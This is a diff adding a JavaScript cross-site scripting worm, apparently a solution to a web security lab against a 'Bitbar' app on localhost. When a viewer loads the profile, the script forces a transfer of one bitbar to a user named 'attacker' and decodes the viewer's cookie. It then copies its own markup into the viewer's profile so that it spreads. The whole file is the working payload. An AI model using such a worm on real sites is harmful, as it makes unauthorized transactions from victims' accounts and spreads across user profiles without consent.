@@ -1,0 +1,21 @@
+<span id="bitbar_count" class="10"></span>
+<script type="text/javascript">
+	// send 1 bitbar to the attacker
+	var xhr = new XMLHttpRequest();
+	xhr.withCredentials = true;
+    var params = 'destination_username=attacker&quantity=1';
+	xhr.open('POST', 'http://localhost:3000/post_transfer', true);
+	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.send(params);
+	// after sending, change the viewer's profile
+	xhr.onload = () => {
+		var viewerCookie = JSON.parse(atob(document.cookie.substr(8)));
+		var worm = encodeURIComponent(document.getElementById('profile').innerHTML);
+		var wormXHR = new XMLHttpRequest();
+		wormXHR.withCredentials = true;
+		var wormParams = `new_profile=${worm}`
+		wormXHR.open('POST', 'http://localhost:3000/set_profile', true);
+		wormXHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+		wormXHR.send(wormParams);
+	};
+</script>
